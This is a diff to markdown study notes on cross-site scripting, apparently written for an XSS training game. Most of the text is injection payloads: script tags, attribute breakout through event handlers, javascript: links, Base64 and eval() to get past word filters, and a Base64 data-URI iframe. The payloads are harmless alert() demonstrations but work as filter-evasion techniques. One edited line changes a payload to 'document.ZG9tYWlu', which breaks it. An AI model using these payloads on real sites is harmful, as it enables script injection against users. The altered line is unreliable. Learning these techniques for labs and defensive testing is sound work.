@@ -145,17 +145,44 @@ document.forms[0].onsubmit = function demo () {
 }
 ```
 
-<script>alert(document.domain);</script>
+`<script>alert(document.ZG9tYWlu);</script>`
 
 **SOMETIMES AN INPUT BOX IS HARDENED, IN THIS CASE TRY TO INSPECT ELEMENTS AND EDIT OPTIONS!!**
 
 sometimes the first character needs to be escaped to html EG:
 
-    &#34> <script>alert(document.domain);</script>
+`&#34> <script>alert(document.domain);</script>`
 
 When you cant "<" and ">", use events such as mouse over / onChange
 
-aaa" onmouseover="alert(document.domain); //here we satisy what should be in input box, close with quote, specify another value and its event
+`aaa" onmouseover="alert(document.domain); //` here we satisy what should be in input box, close with quote, specify another value and its event
 successfully injected string as below:
-    <input type="text" name="p1" size="50" value="aaa" onchange="alert(document.domain);">
+`<input type="text" name="p1" size="50" value="aaa" onchange="alert(document.domain);">`
 
+
+
+A function allowing creation of a link can be XSS attacked using the javascript schema, the link will execute code instead of loading site
+javascript:alert(document.domain);
+
+
+### Word filtering
+when words are filtered out: Via the Stack Overflow question Base64 encoding and decoding in client-side Javascript we find that all modern browsers have a global function galled atob() to decode Base64 strings, read more on Mozilla Developer Network. To execute a string as JavaScript, use eval(). 
+
+`"><script>eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='));</script>`
+
+
+If the words script, style and on aren't allowed, we have to think about something else this time. Apparently it's possible to encode JavaScript as Base64 and make it execute as an iframe src. From the Stack Overflow question Is it possible to "fake" the src attribute of an iframe? we can read that it's possible to do:
+
+:::html
+`<iframe src="data:text/html;base64, .... base64 encoded HTML data ....">`
+Read more about data URIs on Mozilla Developer Network. The HTML data we want to use is:
+
+:::html
+`<script>parent.alert(document.domain);</script>`
+parent. is needed because we want the alert to execute in the context of the parent's window. Encoding it as Base64 with the Character Encoding Calculator results in:
+
+PHNjcmlwdD5wYXJlbnQuYWxlcnQoZG9jdW1lbnQuZG9tYWluKTs8L3NjcmlwdD4
+The code that we will then put into the search box to finish the level is:
+
+:::html
+`"><iframe src="data:text/html;base64,PHNjcmlwdD5wYXJlbnQuYWxlcnQoZG9jdW1lbnQuZG9tYWluKTs8L3NjcmlwdD4="></iframe>`
